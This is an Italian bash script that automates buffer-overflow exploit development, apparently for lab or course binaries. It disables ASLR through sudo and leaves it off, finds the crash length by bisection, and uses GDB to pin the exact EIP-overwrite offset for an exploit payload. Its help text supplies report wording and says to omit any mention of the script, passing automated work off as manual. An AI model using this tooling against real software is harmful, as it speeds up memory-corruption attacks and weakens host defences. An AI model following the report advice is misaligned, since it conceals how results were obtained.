#!/bin/bash
#
# offset_finder.sh - Trova l'offset di un Buffer Overflow in due passi:
#   (1) l'offset di CRASH (bisezione pura) -> dato per il report
#   (2) l'offset dell'EIP (verifica automatica in GDB con 0x42424242) -> per l'exploit

# ----------------------------- Help ----------------------------------------
if [ "$1" == "--help" ] || [ "$1" == "-h" ]; then
cat << 'EOF'
NAME
    offset_finder.sh - Individuazione dell'offset di un Buffer Overflow

SYNOPSIS
    ./offset_finder.sh [-s] ./nome_binario
    ./offset_finder.sh OPTION

DESCRIPTION
    Disabilita temporaneamente l'ASLR e trova l'offset di un Buffer Overflow
    in due passi, stampando ENTRAMBI i risultati:
      1) Offset di CRASH (bisezione pura): la soglia a cui parte il
         Segmentation Fault. E' il dato da riportare nel report.
      2) Offset dell'EIP (verifica automatica in GDB): l'offset esatto a cui
         le "BBBB" finiscono su 0x42424242, cioe' quello da usare per
         l'exploit. Spesso coincide col primo, ma con buffer grandi puo'
         differire di qualche byte (il crash avviene prima del ret): per
         questo lo script affina provando in GDB gli offset vicini, anche
         dispari, finche' l'EIP e' esattamente 0x42424242.
    Il limite della bisezione si adatta da solo raddoppiando, quindi funziona
    con buffer di qualunque dimensione.

    Se il binario esiste ma non ha il permesso di esecuzione, lo script glielo
    assegna da solo con 'chmod +x' prima di iniziare.

OPTIONS
    -s, --stdin
        Inietta il payload tramite Standard Input (pipe) invece che come
        argomento da riga di comando. Indispensabile per binari che
        leggono l'input tramite funzioni come gets() o scanf().

    -h, --help
        Mostra questa guida.

NOTA
    Passa sempre il binario come ./nome_binario (con lo slash). Senza, la
    shell lo cerca nel PATH e non lo esegue, facendo apparire falsamente
    "nessun crash".

REPORTING (DA INSERIRE NEL REPORT, senza citare lo script)
    1. Disattivazione ASLR
       Comando: sudo sysctl -w kernel.randomize_va_space=0
       "Per garantire la stabilita' degli indirizzi di memoria durante lo
       sviluppo dell'exploit, ho temporaneamente disabilitato l'ASLR."

    2. Individuazione dell'Offset di Crash
       Argomento: ./eseguibile $(perl -e 'print "A"x120')
       STDIN:     perl -e 'print "A"x120' | ./eseguibile
       "Ho inviato sequenze incrementali di byte fino a causare un
       Segmentation Fault (SIGSEGV), individuando la soglia del buffer."

    3. Verifica dell'Instruction Pointer in GDB
       Argomento: run $(perl -e 'print "A"x[OFFSET] . "BBBB"')
       STDIN:     run < <(perl -e 'print "A"x[OFFSET] . "BBBB"')
       "Ho verificato l'esatta sovrascrittura dell'EIP appendendo 4 byte 'B'
       (0x42424242); l'offset corretto e' quello a cui l'EIP vale 42424242."
EOF
exit 0
fi

# Variabile di stato per la modalita' STDIN
USE_STDIN=false

if [ "$1" == "-s" ] || [ "$1" == "--stdin" ]; then
	USE_STDIN=true
	shift
fi

if [ "$#" -ne 1 ]; then
	echo "Uso: $0 [-s] ./nome_binario"
	echo "Usa '$0 --help' per leggere il manuale e i comandi per il report."
	exit 1
fi

BINARY="$1"
EXACT_OFFSET=-1

# Avviso se manca lo slash (causa comune di falsi "nessun crash")
if [[ "$BINARY" != /* && "$BINARY" != ./* ]]; then
	echo "[!] Attenzione: '$BINARY' e' senza './'. Senza slash la shell lo cerca"
	echo "    nel PATH e potrebbe non eseguirlo. Consigliato: ./$BINARY"
fi

# Verifica che il binario esista e sia eseguibile; se non lo e', lo rende tale.
if [ ! -e "$BINARY" ]; then
	echo "[-] '$BINARY' non esiste."; exit 1
fi
if [ ! -f "$BINARY" ]; then
	echo "[-] '$BINARY' non e' un file regolare."; exit 1
fi
if [ ! -x "$BINARY" ]; then
	echo "[*] '$BINARY' non ha il permesso di esecuzione: lo imposto con 'chmod +x'..."
	if chmod +x "$BINARY" 2>/dev/null; then
		echo "[+] Permesso di esecuzione impostato su '$BINARY'."
	else
		echo "[!] chmod senza privilegi fallito: riprovo con sudo..."
		if sudo chmod +x "$BINARY"; then
			echo "[+] Permesso di esecuzione impostato (via sudo) su '$BINARY'."
		else
			echo "[-] 'chmod +x' su '$BINARY' fallito anche con sudo."; exit 1
		fi
	fi
fi

# Lancia il binario con N byte di 'A'; ritorna 0 se Segmentation Fault (status 139).
is_crash() {
	local N="$1"
	if [ "$USE_STDIN" = true ]; then
		perl -e "print 'A'x$N" | "$BINARY" > /dev/null 2>&1
	else
		local PAYLOAD
		PAYLOAD=$(perl -e "print 'A'x$N")
		"$BINARY" "$PAYLOAD" > /dev/null 2>&1
	fi
	[ $? -eq 139 ]
}

# Lancia il binario in GDB con N 'A' + "BBBB" e stampa l'EIP al crash (hex, no 0x).
# E' la verifica "info registers eip" fatta a mano, automatizzata.
eip_for() {
	local N="$1" RUNLINE OUT
	if [ "$USE_STDIN" = true ]; then
		RUNLINE="run < <(perl -e 'print \"A\"x$N . \"BBBB\"')"
	else
		RUNLINE="run \$(perl -e 'print \"A\"x$N . \"BBBB\"')"
	fi
	OUT=$(gdb -q -batch \
		-ex "set pagination off" \
		-ex "$RUNLINE" \
		-ex "print/x \$eip" \
		"$BINARY" 2>/dev/null)
	echo "$OUT" | grep -oiE '0x[0-9a-f]+' | tail -n1 | sed 's/^0x//' | tr 'A-F' 'a-f'
}

# Disattivazione ASLR
echo "[*] Disattivazione ASLR..."
sudo sysctl -w kernel.randomize_va_space=0 > /dev/null
if [ $? -ne 0 ]; then
	echo "[-] Errore: Privilegi sudo richiesti per disabilitare ASLR."
	exit 1
fi

if [ "$USE_STDIN" = true ]; then
	echo "[*] Input via STDIN."
else
	echo "[*] Input via Argomento."
fi
echo "--------------------------------------------------"

# ---------------------------------------------------------------------------
# FASE 1: sondaggio del limite superiore (raddoppio finche' non crasha).
# ---------------------------------------------------------------------------
HIGH=1000
MAX_PROBE=1048576

echo "[*] Fase 1: cerco un limite superiore che causi il crash (raddoppio)..."
while true; do
	echo -n "    Provo $HIGH byte -> "
	if is_crash "$HIGH"; then
		echo "CRASH"
		break
	fi
	echo "OK (nessun crash)"
	if [ "$HIGH" -ge "$MAX_PROBE" ]; then
		echo "--------------------------------------------------"
		echo "[-] Nessun crash entro $MAX_PROBE byte."
		echo "    Possibili cause: canale sbagliato (prova/togli -s), binario"
		echo "    non vulnerabile a overflow lineare, o manca lo './' sul nome."
		exit 1
	fi
	HIGH=$(( HIGH * 2 ))
done

LOW=$(( HIGH / 2 ))
[ "$LOW" -lt 1 ] && LOW=1
echo "--------------------------------------------------"
echo "[*] Fase 2: bisezione tra $LOW e $HIGH byte..."
echo "--------------------------------------------------"

# ---------------------------------------------------------------------------
# FASE 2: bisezione classica (piu' piccolo N che causa crash).
# ---------------------------------------------------------------------------
while [ $LOW -le $HIGH ]; do
	MID=$(( (LOW + HIGH) / 2 ))
	echo -n "Testing offset: $MID byte (Range: $LOW-$HIGH) -> "
	if is_crash "$MID"; then
		echo "CRASH (SIGSEGV)"
		EXACT_OFFSET=$MID
		HIGH=$(( MID - 1 ))
	else
		echo "OK"
		LOW=$(( MID + 1 ))
	fi
done

echo "--------------------------------------------------"
if [ $EXACT_OFFSET -eq -1 ]; then
	echo "[-] Nessun crash rilevato (inatteso dopo la Fase 1)."
	exit 1
fi

CRASH_OFFSET=$EXACT_OFFSET
echo "[+] Offset di CRASH (bisezione pura): $CRASH_OFFSET byte"
echo "    (e' il valore da riportare nel report come soglia di Segmentation Fault)"

# ---------------------------------------------------------------------------
# FASE 3: affino fino all'offset che mette ESATTAMENTE 0x42424242 sull'EIP.
# "Dove crasha" != "dove le BBBB finiscono sull'EIP" (con buffer grandi il crash
# avviene prima del ret). Provo in GDB gli offset vicini (anche dispari).
# ---------------------------------------------------------------------------
echo "--------------------------------------------------"
echo "[*] Fase 3: cerco l'offset che mette 0x42424242 sull'EIP (verifica GDB)..."

EIP_OFFSET=-1
BEST_OFF=-1
BEST_EIP=""
BEST_SCORE=-1

for delta in $(seq 0 40); do
	for sign in + -; do
		[ "$delta" -eq 0 ] && [ "$sign" = "-" ] && continue
		N=$(( CRASH_OFFSET ${sign} delta ))
		[ "$N" -lt 0 ] && continue
		EIP=$(eip_for "$N")
		printf "\r    provo offset %d -> eip 0x%s        " "$N" "${EIP:-????}"

		if [ "$EIP" = "42424242" ]; then
			EIP_OFFSET=$N
			break 2
		fi
		SCORE=$(echo "$EIP" | grep -o '42' | wc -l)
		if [ "$SCORE" -gt "$BEST_SCORE" ]; then
			BEST_SCORE=$SCORE; BEST_OFF=$N; BEST_EIP=$EIP
		fi
	done
done
echo ""

echo "--------------------------------------------------"
if [ "$EIP_OFFSET" -ne -1 ]; then
	echo "[+] Offset ESATTO dell'EIP: $EIP_OFFSET byte  (EIP = 0x42424242) <<<"
	echo ""
	echo "[*] Questo e' l'offset da usare per l'exploit (padding prima dell'indirizzo"
	echo "    di ritorno). Per lo shellcode: NOP = $EIP_OFFSET - lunghezza_shellcode."
	echo ""
	echo "[*] Verifica manuale in GDB (per il report):"
	if [ "$USE_STDIN" = true ]; then
		echo "    run < <(perl -e \"print 'A'x$EIP_OFFSET . 'BBBB'\")"
	else
		echo "    run \$(perl -e \"print 'A'x$EIP_OFFSET . 'BBBB'\")"
	fi
else
	echo "[!] Non ho trovato un offset con EIP == 0x42424242 netto nell'intorno."
	echo "    Il piu' vicino: offset $BEST_OFF -> EIP 0x$BEST_EIP"
	echo "    Prova a mano aggiustando di +/-1-2 attorno a $BEST_OFF, cercando 42424242:"
	if [ "$USE_STDIN" = true ]; then
		echo "    run < <(perl -e \"print 'A'x$BEST_OFF . 'BBBB'\")"
	else
		echo "    run \$(perl -e \"print 'A'x$BEST_OFF . 'BBBB'\")"
	fi
	echo "    (EIP 'misto' tipo 0x..4242 = sei a 1-3 byte; sposta finche' e' tutto 42.)"
fi
